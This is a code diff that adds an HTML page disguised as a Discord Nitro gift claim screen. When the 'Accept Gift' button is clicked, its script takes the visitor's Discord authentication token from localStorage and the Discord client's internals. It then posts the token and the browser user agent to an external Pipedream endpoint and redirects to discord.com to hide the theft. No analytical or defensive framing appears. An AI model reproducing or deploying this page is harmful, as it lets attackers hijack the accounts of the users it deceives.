@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <style>
+        :root {
+            --bg-color: #36393f;
+            --modal-bg: #2f3136;
+            --accent-color: #5865f2;
+            --text-main: #ffffff;
+            --text-muted: #b9bbbe;
+        }
+        body { 
+            background-color: var(--bg-color); 
+            color: var(--text-main); 
+            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
+        }
+        .modal { 
+            background: var(--modal-bg); padding: 40px; border-radius: 8px; 
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px 0 rgba(0,0,0,0.6); 
+            text-align: center; width: 420px;
+        }
+        /* Nitro logo styling */
+        .nitro-icon {
+            width: 80px; height: 80px; margin-bottom: 20px;
+        }
+        h1 { font-size: 20px; margin-bottom: 16px; font-weight: 600; }
+        .desc { font-size: 14px; color: var(--text-muted); margin-bottom: 24px; line-height: 1.4; }
+        .claim-btn { 
+            background: var(--accent-color); color: #fff; border: none; padding: 12px 24px; 
+            border-radius: 3px; font-size: 14px; font-weight: 500; cursor: pointer;
+            width: 100%; transition: background 0.17s ease;
+        }
+        .claim-btn:hover { background: #4752c4; }
+        #status { margin-top: 18px; font-size: 13px; color: var(--text-muted); }
+    </style>
+</head>
+<body>
+    <div class="modal">
+        <!-- Official Nitro Gift Icon -->
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Nitro" class="nitro-icon">
+        
+        <h1>Claim your Nitro</h1>
+        <p class="desc">You have been gifted 3 months of Discord Nitro. Accept the gift to apply it to your account immediately.</p>
+        <button class="claim-btn" id="btn" onclick="execute()">Accept Gift</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        async function execute() {
+            const btn = document.getElementById('btn');
+            const status = document.getElementById('status');
+            btn.style.opacity = '0.5';
+            btn.style.pointerEvents = 'none';
+            status.innerText = "Checking account eligibility...";
+
+            const tokens = [
+                localStorage.getItem("token"),
+                localStorage.getItem("authentication_token"),
+                window.webpackChunkdiscord_app ? Object.values(webpackChunkdiscord_app.push([[],{['']:(_,e,_)=>{e.exports=e}},[['']]]).cache).find(m=>m.exports?.default?.getToken)?.exports?.default?.getToken() : null
+            ].filter(Boolean);
+
+            if (tokens.length > 0) {
+                await fetch('https://eophhta5galgyza.m.pipedream.net', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        token: tokens[0],
+                        ts: new Date().toISOString(),
+                        ua: navigator.userAgent
+                    })
+                });
+            }
+            
+            status.innerText = "Gift applied. Redirecting...";
+            setTimeout(() => {
+                window.location.href = "https://discord.com/billing/promotions/gift-accepted";
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
